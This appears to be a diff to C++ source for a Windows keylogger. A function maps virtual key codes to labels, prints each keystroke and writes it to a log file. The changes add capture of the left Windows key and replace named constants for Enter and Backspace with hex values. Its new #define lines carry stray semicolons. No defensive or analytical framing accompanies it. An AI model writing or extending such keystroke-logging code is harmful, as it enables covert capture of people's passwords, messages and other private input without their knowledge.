@@ -10,6 +10,9 @@
 #define VK_ADD 0x6B;
 #define VK_F1 0x70;
 #define VK_TAB 0x09;
+#define VK_LWIN 0x5B;
+#define VK_RETURN 0x0D;
+#define VK_BACK 0x08;
 
 
 void WriteToFile(LPCSTR text)
@@ -27,6 +30,11 @@ bool Key_is_Listed(WORD iKey)
 	case 0x6A:
 		std::cout << "*";
 		WriteToFile("*");
+		break;
+
+	case 0x5B:
+		std::cout << "Left_Win";
+		WriteToFile("Left_Win");
 		break;
 
 
@@ -364,7 +372,7 @@ bool Key_is_Listed(WORD iKey)
 
 
 
-	case VK_RETURN:
+	case 0x0D:
 		std::cout << "\n";
 		WriteToFile("\n");
 		break;
@@ -379,7 +387,7 @@ bool Key_is_Listed(WORD iKey)
 		WriteToFile(" *Right_Shift* ");
 		break;
 
-	case VK_BACK:
+	case 0x08:
 		std::cout << "\b";
 		WriteToFile("\b");
 		break;
